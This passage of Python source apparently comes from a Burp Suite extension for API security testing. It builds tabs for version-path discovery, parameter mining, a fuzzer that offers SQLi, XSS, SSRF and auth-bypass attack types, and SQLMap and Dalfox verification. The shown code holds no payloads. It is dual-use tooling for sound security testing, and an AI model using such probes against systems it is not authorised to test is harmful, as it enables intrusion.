                "exclude_tags": "dos,intrusive,headless,cve,fuzz,fuzzing,brute-force",
                "request_timeout": 12,
                "retries": 2,
                "rate_limit": 40,
                "concurrency": 8,
                "bulk_size": 4,
                "max_host_error": 6,
                "scan_strategy": "host-spray",
                "max_scan_seconds": 1200,
            }
        return {
            "profile": "balanced",
            "include_tags": "swagger,openapi,graphql,auth,jwt",
            "exclude_tags": "dos,intrusive,headless,cve,fuzz,fuzzing,brute-force",
            "request_timeout": 10,
            "retries": 1,
            "rate_limit": 70,
            "concurrency": 12,
            "bulk_size": 6,
            "max_host_error": 8,
            "scan_strategy": "host-spray",
            "max_scan_seconds": 900,
        }

    def _evaluate_help_text(
        self, help_text, required_tokens=None, forbidden_tokens=None
    ):
        """Evaluate required/forbidden token health on help output."""
        lower_text = self._ascii_safe(help_text, lower=True)
        required = list(required_tokens or [])
        forbidden = list(forbidden_tokens or [])
        missing = [token for token in required if token.lower() not in lower_text]
        forbidden_found = [token for token in forbidden if token.lower() in lower_text]
        return {
            "missing": missing,
            "forbidden_found": forbidden_found,
            "healthy": (len(missing) == 0 and len(forbidden_found) == 0),
        }

    def _add_target_scope_controls(self, controls):
        """Attach shared target-base scope controls for external tool tabs."""
        controls.add(
            self._create_action_button(
                "Target Bases...",
                Color(96, 125, 139),
                lambda e: self._open_target_base_scope_popup(),
            )
        )
        checkbox = JCheckBox(
            "Only Base+Derivatives", bool(self.target_base_scope_only_enabled)
        )
        checkbox.setToolTipText(
            "Restrict scans to popup base URLs/hosts and same base-domain derivatives."
        )
        checkbox.addActionListener(
            lambda _event, cb=checkbox: self._set_target_base_scope_only(
                cb.isSelected()
            )
        )
        controls.add(checkbox)
        self.target_scope_checkboxes.append(checkbox)

    def _set_target_base_scope_only(self, enabled):
        """Synchronize target-base-only scope state across tab checkboxes."""
        desired = bool(enabled)
        changed = desired != bool(self.target_base_scope_only_enabled)
        self.target_base_scope_only_enabled = desired
        if self._syncing_target_scope_checkboxes:
            return
        self._syncing_target_scope_checkboxes = True
        try:
            for checkbox in self.target_scope_checkboxes:
                if checkbox is None:
                    continue
                if checkbox.isSelected() != desired:
                    checkbox.setSelected(desired)
        finally:
            self._syncing_target_scope_checkboxes = False

        if changed:
            state = "enabled" if desired else "disabled"
            self.log_to_ui("[*] Base URL scope mode {}".format(state))

    def _add_force_kill_button(self, controls, output_area=None):
        """Attach emergency kill button for external scanner processes."""

        def on_click(_event):
            area = output_area() if callable(output_area) else output_area
            self._pkill_external_tools(area)

        controls.add(
            self._create_action_button(
                "PKill Tools",
                Color(183, 28, 28),
                on_click,
            )
        )

    def _create_command_preset_combo(
        self, field, checkbox, presets, help_label=None, auto_enable=False
    ):
        """Create preset dropdown that populates command field from templates."""
        labels = ["Preset Cmd..."]
        labels.extend([label for label, _, _ in presets])
        combo = JComboBox(labels)
        combo.setToolTipText(
            "Select a preset to auto-fill the command textbox"
        )

        def on_select(_event):
            idx = combo.getSelectedIndex()
            if idx <= 0:
                return
            _, template, description = presets[idx - 1]
            field.setText(template)
            if auto_enable:
                checkbox.setSelected(True)
            if help_label:
                hint = description
                if not checkbox.isSelected():
                    hint = "{} Check 'Enable Custom' to run it.".format(description)
                help_label.setText("Preset Help: {}".format(hint))
                help_label.setToolTipText(hint)
            combo.setSelectedIndex(0)

        combo.addActionListener(on_select)
        return combo

    def _create_preset_help_button(
        self,
        title,
        placeholders,
        presets,
        usage_notes=None,
        override_notes=None,
    ):
        """Create small help button that explains commands and override usage."""
        btn = JButton("?")
        btn.setToolTipText("Show command usage and preset help")

        def on_help(_event):
            lines = []
            lines.append("{} Command Help".format(title))
            lines.append("=" * 60)
            lines.append("")
            lines.append("Quick Start:")
            lines.append("  1) Default mode: leave 'Enable Custom' unchecked.")
            lines.append(
                "  2) Override mode: check 'Enable Custom' and provide Command text."
            )
            lines.append(
                "  3) Preset dropdown fills Command text only; override stays opt-in."
            )
            lines.append("  4) Use Stop button to cancel long-running scans.")
            if usage_notes:
                lines.append("")
                lines.append("Tool Notes:")
                for note in usage_notes:
                    lines.append("  - {}".format(note))
            lines.append("Placeholders:")
            for placeholder in placeholders:
                lines.append("  - {}".format(placeholder))
            lines.append("")
            lines.append("Override Rules:")
            lines.append("  - Custom command must be valid shell syntax.")
            lines.append("  - Unknown placeholders are rejected.")
            lines.append("  - Empty custom command is rejected when override is enabled.")
            if override_notes:
                for note in override_notes:
                    lines.append("  - {}".format(note))
            lines.append("")
            lines.append("Available Presets:")
            for label, template, description in presets:
                lines.append("")
                lines.append("[{}]".format(label))
                lines.append("  {}".format(description))
                lines.append("  {}".format(template))

            JOptionPane.showMessageDialog(
                self._panel,
                "\n".join(lines),
                "{} Command Help".format(title),
                JOptionPane.INFORMATION_MESSAGE,
            )

        btn.addActionListener(on_help)
        return btn

    def _create_text_area_panel(self):
        """Helper to create read-only text area with scroll"""
        area = JTextArea()
        area.setEditable(False)
        area.setFont(Font("Monospaced", Font.PLAIN, 11))
        return area, JScrollPane(area)

    def _show_recon_button_help(self, _event=None):
        """Show Recon button reference to reduce UI ambiguity."""
        lines = []
        lines.append("Recon Button Help")
        lines.append("=" * 60)
        lines.append("")
        lines.append("Export All:")
        lines.append("  Export full Recon dataset and analysis to JSON.")
        lines.append("Export Host:")
        lines.append("  Export only endpoints matching the selected host filter.")
        lines.append("Export AI Bundle:")
        lines.append("  Export all-tab AI bundle (not only fuzzer data).")
        lines.append("Import:")
        lines.append("  Import a previous Recon JSON export.")
        lines.append("Postman:")
        lines.append("  Export scoped endpoints to Postman Collection v2.1.")
        lines.append("Insomnia:")
        lines.append("  Export scoped endpoints to Insomnia import JSON.")
        lines.append("Tool Health:")
        lines.append("  Verify local external-tool binaries and key options.")
        lines.append("Button Help:")
        lines.append("  Show this reference dialog.")
        lines.append("Clear Data:")
        lines.append("  Clear captured Recon state and UI list/details.")
        lines.append("Refresh:")
        lines.append("  Recompute and redraw Recon list/stats from current state.")
        lines.append("")
        lines.append("Tip: hover any Recon button to see a quick tooltip.")
        JOptionPane.showMessageDialog(
            self._panel,
            "\n".join(lines),
            "Recon Button Help",
            JOptionPane.INFORMATION_MESSAGE,
        )

    def _copy_to_clipboard(self, text):
        """Copy text to system clipboard"""
        from java.awt import Toolkit
        from java.awt.datatransfer import StringSelection

        if text:
            selection = StringSelection(text)
            clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
            clipboard.setContents(selection, None)
            self.log_to_ui("[+] Copied {} chars to clipboard".format(len(text)))
        else:
            self.log_to_ui("[!] No text to copy")

    def _create_diff_tab(self):
        """Create the Diff comparison tab"""
        panel = JPanel(BorderLayout())
        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Compare:"))
        controls.add(
            JButton("Load Export 1").addActionListener(
                lambda e: self._load_diff_file(1)
            )
            or JButton("Load Export 1")
        )
        controls.add(
            JButton("Load Export 2").addActionListener(
                lambda e: self._load_diff_file(2)
            )
            or JButton("Load Export 2")
        )
        controls.add(
            self._create_action_button(
                "Compare", Color(40, 167, 69), lambda e: self._run_diff()
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.diff_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.diff_area.getText()),
            )
        )
        panel.add(controls, BorderLayout.NORTH)
        self.diff_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.diff_file1 = None
        self.diff_file2 = None
        return panel

    def _load_diff_file(self, slot):
        chooser = JFileChooser()
        if chooser.showOpenDialog(self._panel) == JFileChooser.APPROVE_OPTION:
            filepath = chooser.getSelectedFile().getAbsolutePath()
            if slot == 1:
                self.diff_file1 = filepath
                self.log_to_ui("[+] Loaded Export 1: {}".format(filepath))
            else:
                self.diff_file2 = filepath
                self.log_to_ui("[+] Loaded Export 2: {}".format(filepath))

    def _run_diff(self):
        if not self.diff_file1 or not self.diff_file2:
            self.diff_area.setText("Load both exports first")
            return

        try:
            with open(self.diff_file1) as f:
                data1 = json.load(f)
            with open(self.diff_file2) as f:
                data2 = json.load(f)

            eps1 = set([ep["endpoint"] for ep in data1["endpoints"]])
            eps2 = set([ep["endpoint"] for ep in data2["endpoints"]])

            added = eps2 - eps1
            removed = eps1 - eps2
            common = eps1 & eps2

            result = []
            result.append("=" * 80)
            result.append("DIFF COMPARISON")
            result.append("=" * 80)
            result.append("Export 1: {} endpoints".format(len(eps1)))
            result.append("Export 2: {} endpoints".format(len(eps2)))
            result.append("")
            result.append("Added: {} endpoints".format(len(added)))
            for ep in sorted(added)[:20]:
                result.append("  + {}".format(ep))
            result.append("")
            result.append("Removed: {} endpoints".format(len(removed)))
            for ep in sorted(removed)[:20]:
                result.append("  - {}".format(ep))
            result.append("")
            result.append("Unchanged: {} endpoints".format(len(common)))

            self.diff_area.setText("\n".join(result))
            self.log_to_ui(
                "[+] Diff complete: +{} -{} ={}".format(
                    len(added), len(removed), len(common)
                )
            )
        except Exception as e:
            self.diff_area.setText("Error: {}".format(str(e)))

    def _create_scanner_tab(self, label, default_input, button_text, action, area_attr):
        """Helper to create scanner-style tabs"""
        panel = JPanel(BorderLayout())
        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel(label))
        input_field = JTextField(default_input, 30)
        controls.add(input_field)
        controls.add(
            self._create_action_button(button_text, Color(40, 167, 69), action)
        )
        panel.add(controls, BorderLayout.NORTH)
        area, scroll = self._create_text_area_panel()
        setattr(self, area_attr, area)
        setattr(self, area_attr.replace("_area", "_input"), input_field)
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _create_version_tab(self):
        """Create Version Scanner tab"""
        panel = JPanel(BorderLayout())

        # Top controls
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        # Input row
        input_row = JPanel(FlowLayout(FlowLayout.LEFT))
        input_row.add(JLabel("Versions:"))
        self.version_input = JTextField(
            "v1,v2,v3,v4,v5,api/v1,api/v2,api/v3,v1.0,v2.0,rest/v1,mobile/v1,internal/v1,dev,test,staging,beta,alpha,old,legacy,deprecated",
            35,
        )
        input_row.add(self.version_input)

        # Preset buttons
        preset_row = JPanel(FlowLayout(FlowLayout.LEFT))
        preset_row.add(JLabel("Presets:"))
        preset_row.add(
            self._create_action_button(
                "Standard",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "v1,v2,v3,v4,v5,api/v1,api/v2,api/v3"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Decimal",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "v1.0,v1.1,v2.0,v2.1,v3.0,api/v1.0,api/v2.0"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Environments",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "dev,test,staging,beta,alpha,prod,internal"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Legacy",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "old,legacy,deprecated,v0,archive,backup"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "All",
                Color(108, 117, 125),
                lambda e: self.version_input.setText(
                    "v1,v2,v3,v4,v5,api/v1,api/v2,api/v3,v1.0,v2.0,rest/v1,mobile/v1,internal/v1,dev,test,staging,beta,alpha,old,legacy,deprecated"
                ),
            )
        )

        # Action buttons
        action_row = JPanel(FlowLayout(FlowLayout.LEFT))
        self.version_lenient_checkbox = JCheckBox("Lenient JSON GET", False)
        self.version_lenient_checkbox.setToolTipText(
            "Include JSON/XML GET routes without explicit /api/ marker"
        )
        action_row.add(self.version_lenient_checkbox)
        action_row.add(
            self._create_action_button(
                "Scan Versions", Color(40, 167, 69), lambda e: self._scan_versions()
            )
        )
        action_row.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_version_results(),
            )
        )
        action_row.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.version_area.setText("")
            )
        )
        action_row.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.version_area.getText()),
            )
        )

        top_panel.add(input_row)
        top_panel.add(preset_row)
        top_panel.add(action_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.version_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _format_result(self, title, lines):
        """Helper to format result output"""
        # Decode HTML entities
        formatted_lines = []
        for line in lines:
            line = (
                line.replace("&gt;", ">")
                .replace("&lt;", "<")
                .replace("&amp;", "&")
                .replace("&quot;", '"')
                .replace("&#39;", "'")
            )
            formatted_lines.append(line)
        return "\n".join([title, "=" * 80, ""] + formatted_lines)

    def _scan_versions(self):
        versions = [
            v.strip() for v in self.version_input.getText().split(",") if v.strip()
        ]
        self.version_results = []
        lines = []
        excluded_missing_host = 0
        lenient_mode = bool(
            hasattr(self, "version_lenient_checkbox")
            and self.version_lenient_checkbox is not None
            and self.version_lenient_checkbox.isSelected()
        )

        api_endpoints, filter_meta = self._collect_version_targets(lenient=lenient_mode)

        if not api_endpoints:
            self.version_area.setText(
                "[!] No API endpoints found (filtered out static/noisy endpoints)\n"
            )
            return

        for key, entries in api_endpoints.items():
            entry = self._get_entry(entries)
            normalized = self._normalize_endpoint_data(entry)
            path = normalized.get("path") or "/"
            host = self._ascii_safe(normalized.get("host"), lower=True).strip() or self._ascii_safe(
                entry.get("host"), lower=True
            ).strip()
            protocol = self._ascii_safe(
                normalized.get("protocol"), lower=True
            ).strip() or self._ascii_safe(entry.get("protocol"), lower=True).strip() or "https"
            if not host:
                excluded_missing_host += 1
                continue

            for ver in versions:
                test_path = self._build_version_test_path(path, ver)
                result = "Test: {} -> {}://{}{}".format(key, protocol, host, test_path)
                lines.append(result)
                self.version_results.append(result)

        summary = []
        summary.append(
            "[*] Mode: {}".format("Lenient JSON GET" if lenient_mode else "Strict")
        )
        summary.append(
            "[*] Filtered: {} API endpoints (excluded {} static/noisy endpoints)".format(
                len(api_endpoints), filter_meta.get("excluded_endpoints", 0)
            )
        )
        if excluded_missing_host:
            summary.append(
                "[*] Skipped: {} endpoints missing host metadata".format(
                    excluded_missing_host
                )
            )
        summary.append("[*] Testing {} version variations".format(len(versions)))
        summary.append("[*] Total tests: {}\n".format(len(self.version_results)))

        self.version_area.setText(
            self._format_result(
                "Version Discovery: {}".format(", ".join(versions)), summary + lines
            )
        )
        self.log_to_ui(
            "[*] Version scan: {} API endpoints, {} tests".format(
                len(api_endpoints), len(self.version_results)
            )
        )

    def _build_version_test_path(self, path, version_value):
        """Build version probe path while preserving existing versioned routes when possible."""
        normalized_path = self._ascii_safe(path or "/")
        if not normalized_path.startswith("/"):
            normalized_path = "/" + normalized_path
        token = self._ascii_safe(version_value or "").strip().strip("/")
        if not token:
            return normalized_path

        existing_version = self._extract_version_segment(normalized_path)

        if existing_version and "/" not in token:
            replaced = re.sub(
                r"/" + re.escape(existing_version) + r"(?=/|$)",
                "/" + token,
                normalized_path,
                count=1,
            )
            if replaced:
                return replaced

        if existing_version and token.startswith("api/"):
            replaced = re.sub(
                r"/api/" + re.escape(existing_version) + r"(?=/|$)",
                "/" + token,
                normalized_path,
                count=1,
            )
            if replaced:
                return replaced

        if normalized_path == "/":
            return "/" + token
        return "/" + token + normalized_path

    def _export_version_results(self):
        """Export version scan results - only saves when user clicks Export"""
        if not hasattr(self, "version_results") or not self.version_results:
            self.version_area.append("\n[!] Run 'Scan Versions' first\n")
            return
        import os

        export_dir = self._get_export_dir("VersionScan_Export")
        if not export_dir:
            return
        filepath = os.path.join(export_dir, "version_scan.txt")
        writer = None
        try:
            writer = FileWriter(filepath)
            for result in self.version_results:
                writer.write(result + "\n")
            self.version_area.append(
                "\n[+] Exported {} results\n[+] Folder: {}\n[+] File: {}\n".format(
                    len(self.version_results), export_dir, filepath
                )
            )
            self.log_to_ui("[+] Exported version scan to: {}".format(export_dir))
        except Exception as e:
            self.version_area.append("\n[!] Export failed: {}\n".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing version scan file: {}".format(str(e))
                    )

    def _create_param_tab(self):
        """Create Param Miner tab"""
        panel = JPanel(BorderLayout())

        # Top controls
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        # Input row
        input_row = JPanel(FlowLayout(FlowLayout.LEFT))
        input_row.add(JLabel("Params:"))
        self.param_input = JTextField(
            "admin,debug,internal,test,dev,is_admin,role,callback,redirect,url,hidden,secret,verbose,trace,access_token,api_key",
            35,
        )
        input_row.add(self.param_input)

        # Preset buttons
        preset_row = JPanel(FlowLayout(FlowLayout.LEFT))
        preset_row.add(JLabel("Presets:"))
        preset_row.add(
            self._create_action_button(
                "Admin",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "admin,is_admin,isAdmin,role,admin_panel,administrator"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Debug",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "debug,verbose,trace,log,logging,dev_mode,test_mode"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Access",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "internal,private,hidden,secret,key,token,access"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "Callback",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "callback,redirect,url,return_url,next,dest,destination"
                ),
            )
        )
        preset_row.add(
            self._create_action_button(
                "All",
                Color(108, 117, 125),
                lambda e: self.param_input.setText(
                    "admin,debug,internal,test,dev,is_admin,role,callback,redirect,url,hidden,secret,verbose,trace,access_token,api_key"
                ),
            )
        )

        # Action buttons
        action_row = JPanel(FlowLayout(FlowLayout.LEFT))
        self.param_lenient_checkbox = JCheckBox("Lenient JSON GET", False)
        self.param_lenient_checkbox.setToolTipText(
            "Include structured GET routes even without explicit /api/ marker"
        )
        action_row.add(self.param_lenient_checkbox)
        action_row.add(
            self._create_action_button(
                "Mine Params", Color(40, 167, 69), lambda e: self._mine_params()
            )
        )
        action_row.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_param_results(),
            )
        )
        action_row.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.param_area.setText("")
            )
        )
        action_row.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.param_area.getText()),
            )
        )

        top_panel.add(input_row)
        top_panel.add(preset_row)
        top_panel.add(action_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.param_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _mine_params(self):
        if not self.api_data:
            self.param_area.setText(
                "[!] No endpoints captured. Import data or capture traffic first."
            )
            self.log_to_ui("[!] No endpoints to mine")
            return

        base_params = [p.strip() for p in self.param_input.getText().split(",")]
        self.param_results = []
        lenient_mode = bool(
            hasattr(self, "param_lenient_checkbox")
            and self.param_lenient_checkbox is not None
            and self.param_lenient_checkbox.isSelected()
        )

        api_endpoints, filter_meta = self._collect_param_targets(
            strict_base=not lenient_mode
        )

        if not api_endpoints:
            self.param_area.setText(
                "[!] No API endpoints found (filtered out static/noisy endpoints)\n"
            )
            return

        # Group by priority
        high_priority = {}
        medium_priority = {}

        for key, entries in api_endpoints.items():
            entry = self._get_entry(entries)
            path = entry["normalized_path"].lower()
            method = entry["method"]

            # High priority: write operations or admin paths
            if method in ["POST", "PUT", "PATCH", "DELETE"] or any(
                x in path for x in ["/admin", "/user", "/account", "/profile"]
            ):
                high_priority[key] = entries
            else:
                medium_priority[key] = entries

        lines = []
        lines.append(
            "[*] Mode: {}".format("Lenient JSON GET" if lenient_mode else "Strict")
        )
        lines.append(
            "[*] Filtered: {} API endpoints (excluded {} static/noisy endpoints)".format(
                len(api_endpoints), filter_meta.get("excluded_endpoints", 0)
            )
        )
        lines.append(
            "[*] High Priority: {} | Medium Priority: {}\n".format(
                len(high_priority), len(medium_priority)
            )
        )

        # Process high priority first
        if high_priority:
            lines.append("\n=== HIGH PRIORITY (Write Operations) ===")
            for key, entries in sorted(high_priority.items())[:15]:
                entry = self._get_entry(entries)
                existing = entry.get("parameters", {})
                url_params = (
                    list(existing.get("url", {}).keys())
                    if isinstance(existing.get("url"), dict)
                    else existing.get("url", [])
                )

                # Smart param suggestions based on endpoint
                path = entry["normalized_path"].lower()
                smart_params = list(base_params)
                if "/user" in path or "/account" in path:
                    smart_params.extend(["user_id", "role", "is_admin"])
                if entry["method"] in ["POST", "PUT", "PATCH"]:
                    smart_params.extend(["_method", "callback"])

                result = "{}\n  Existing: {}\n  Test: {}".format(
                    key,
                    ", ".join(url_params[:8]) if url_params else "None",
                    ", ".join(list(set(smart_params))[:10]),
                )
                lines.append(result)
                self.param_results.append(result)

        # Process medium priority (limited)
        if medium_priority:
            lines.append("\n=== MEDIUM PRIORITY (Read Operations) ===")
            for key, entries in sorted(medium_priority.items())[:10]:
                entry = self._get_entry(entries)
                existing = entry.get("parameters", {})
                url_params = (
                    list(existing.get("url", {}).keys())
                    if isinstance(existing.get("url"), dict)
                    else existing.get("url", [])
                )
                result = "{}\n  Existing: {}\n  Test: {}".format(
                    key,
                    ", ".join(url_params[:8]) if url_params else "None",
                    ", ".join(base_params),
                )
                lines.append(result)
                self.param_results.append(result)

        if len(medium_priority) > 10:
            lines.append(
                "\n[*] {} more medium priority endpoints not shown".format(
                    len(medium_priority) - 10
                )
            )

        self.param_area.setText(
            self._format_result(
                "Parameter Mining: {}".format(", ".join(base_params)), lines
            )
        )
        self.log_to_ui(
            "[*] Param mining: {} API endpoints ({} high, {} medium)".format(
                len(api_endpoints), len(high_priority), len(medium_priority)
            )
        )

    def _export_param_results(self):
        """Export param mining results - only saves when user clicks Export"""
        if not hasattr(self, "param_results") or not self.param_results:
            self.param_area.append("\n[!] Run 'Mine Params' first\n")
            return
        import os

        export_dir = self._get_export_dir("ParamMiner_Export")
        if not export_dir:
            return
        filepath = os.path.join(export_dir, "param_mining.txt")
        writer = None
        try:
            writer = FileWriter(filepath)
            for result in self.param_results:
                writer.write(result + "\n\n")
            self.param_area.append(
                "\n[+] Exported {} results\n[+] Folder: {}\n[+] File: {}\n".format(
                    len(self.param_results), export_dir, filepath
                )
            )
            self.log_to_ui("[+] Exported param mining to: {}".format(export_dir))
        except Exception as e:
            self.param_area.append("\n[!] Export failed: {}\n".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing param mining file: {}".format(str(e))
                    )

    def _create_fuzzer_tab(self):
        """Create Fuzzer tab"""
        panel = JPanel(BorderLayout())

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Attack:"))
        self.attack_type_combo = JComboBox(
            [
                "All",
                "BOLA",
                "IDOR",
                "Auth Bypass",
                "SQLi",
                "XSS",
                "NoSQL",
                "Path Traversal",
                "Mass Assignment",
                "Race Condition",
                "GraphQL",
                "JWT",
                "SSTI",
                "Deserialization",
                "Business Logic",
                "SSRF",
                "XXE",
                "WAF Bypass",
            ]
        )
        controls.add(self.attack_type_combo)
        self.fuzzer_lenient_checkbox = JCheckBox("Lenient JSON GET", False)
        self.fuzzer_lenient_checkbox.setToolTipText(
            "Broaden endpoint selection to include structured GET routes"
        )
        controls.add(self.fuzzer_lenient_checkbox)
        controls.add(
            self._create_action_button(
                "Generate",
                Color(220, 53, 69),
                lambda e: self._generate_fuzzing(
                    str(self.attack_type_combo.getSelectedItem())
                ),
            )
        )
        controls.add(
            self._create_action_button(
                "Send to Intruder",
                Color(255, 140, 0),
                lambda e: self._send_fuzzing_to_intruder(),
            )
        )
        controls.add(
            self._create_action_button(
                "Export Payloads", Color(0, 123, 255), lambda e: self._export_payloads()
            )
        )
        controls.add(
            self._create_action_button(
                "Turbo Intruder",
                Color(255, 87, 34),
                lambda e: self._export_turbo_intruder(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.fuzzer_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.fuzzer_area.getText()),
            )
        )
        controls.add(
            self._create_action_button(
                "Copy as cURL",
                Color(76, 175, 80),
                lambda e: self._copy_attack_as_curl(),
            )
        )

        panel.add(controls, BorderLayout.NORTH)

        self.fuzzer_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.fuzzing_attacks = []
        return panel

    def _create_sqlmap_verify_tab(self):
        """Create SQLMap verification tab for SQLi candidate confirmation."""
        import os

        panel = JPanel(BorderLayout())
        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("SQLMap Path:"))
        sqlmap_candidates = [
            os.path.expanduser("~/.local/bin/sqlmap"),
            os.path.expanduser("~/go/bin/sqlmap"),
            "sqlmap",
        ]
        default_sqlmap = next(
            (p for p in sqlmap_candidates if os.path.exists(p)),
            "sqlmap",
        )
        self.sqlmap_path_field = JTextField(default_sqlmap, 28)
        controls.add(self.sqlmap_path_field)
        controls.add(JLabel("Max Targets:"))
        self.sqlmap_max_targets_field = JTextField("12", 4)
        controls.add(self.sqlmap_max_targets_field)
        controls.add(JLabel("Per Target Timeout(s):"))
        self.sqlmap_target_timeout_field = JTextField("45", 4)
        controls.add(self.sqlmap_target_timeout_field)
        controls.add(JLabel("Profile:"))
        self.sqlmap_profile_combo = JComboBox(self._profile_labels())
        self.sqlmap_profile_combo.setSelectedItem("Balanced")
        controls.add(self.sqlmap_profile_combo)
        controls.add(
            self._create_action_button(
                "Run Verify", Color(220, 53, 69), lambda e: self._run_sqlmap_verify(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_sqlmap(e)
            )
        )
        self._add_force_kill_button(controls, lambda: getattr(self, "sqlmap_area", None))
        controls.add(
            self._create_action_button(
                "Send to Recon",
                Color(76, 175, 80),
                lambda e: self._send_sqlmap_to_recon(),
            )
        )
        controls.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_sqlmap_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(108, 117, 125), lambda e: self.sqlmap_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(96, 125, 139),
                lambda e: self._copy_to_clipboard(self.sqlmap_area.getText()),
            )
        )

        panel.add(controls, BorderLayout.NORTH)
        self.sqlmap_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.sqlmap_findings = []
        self.sqlmap_verified_candidates = []
        self.sqlmap_lock = threading.Lock()
        return panel

    def _create_dalfox_verify_tab(self):
        """Create Dalfox verification tab for reflected XSS confirmation."""
        import os

        panel = JPanel(BorderLayout())
        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Dalfox Path:"))
        dalfox_candidates = [
            os.path.expanduser("~/go/bin/dalfox"),
            os.path.expanduser("~/.local/bin/dalfox"),
            "dalfox",
        ]
        default_dalfox = next(
            (p for p in dalfox_candidates if os.path.exists(p)),
            "dalfox",
        )
        self.dalfox_path_field = JTextField(default_dalfox, 28)
        controls.add(self.dalfox_path_field)
        controls.add(JLabel("Max Targets:"))
        self.dalfox_max_targets_field = JTextField("12", 4)
        controls.add(self.dalfox_max_targets_field)
        controls.add(JLabel("Per Target Timeout(s):"))
        self.dalfox_target_timeout_field = JTextField("40", 4)
        controls.add(self.dalfox_target_timeout_field)
        controls.add(JLabel("Profile:"))
        self.dalfox_profile_combo = JComboBox(self._profile_labels())
        self.dalfox_profile_combo.setSelectedItem("Balanced")
        controls.add(self.dalfox_profile_combo)
        controls.add(
            self._create_action_button(
                "Run Verify", Color(220, 53, 69), lambda e: self._run_dalfox_verify(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_dalfox(e)
            )
        )
        self._add_force_kill_button(controls, lambda: getattr(self, "dalfox_area", None))
        controls.add(
            self._create_action_button(
                "Send to Recon",
                Color(76, 175, 80),
                lambda e: self._send_dalfox_to_recon(),
            )
        )
        controls.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_dalfox_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(108, 117, 125), lambda e: self.dalfox_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(96, 125, 139),
                lambda e: self._copy_to_clipboard(self.dalfox_area.getText()),
            )
        )

        panel.add(controls, BorderLayout.NORTH)
        self.dalfox_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.dalfox_findings = []
        self.dalfox_verified_candidates = []
        self.dalfox_lock = threading.Lock()
        return panel

    def _create_api_asset_discovery_tab(self):
        """Create Subfinder tab for API asset domain discovery."""
        import os

        panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Domains (comma/newline, optional):"))
        self.asset_domains_field = JTextField("", 28)
        self.asset_domains_field.setToolTipText(
            "Leave empty to auto-derive base domains from Recon hosts"
        )
        controls.add(self.asset_domains_field)
        controls.add(JLabel("Max Domains:"))
        self.asset_max_domains_field = JTextField("8", 3)
        controls.add(self.asset_max_domains_field)
        controls.add(
            self._create_action_button(
                "Show Targets",
                Color(70, 130, 180),
                lambda e: self._show_asset_targets_popup(e),
            )
        )
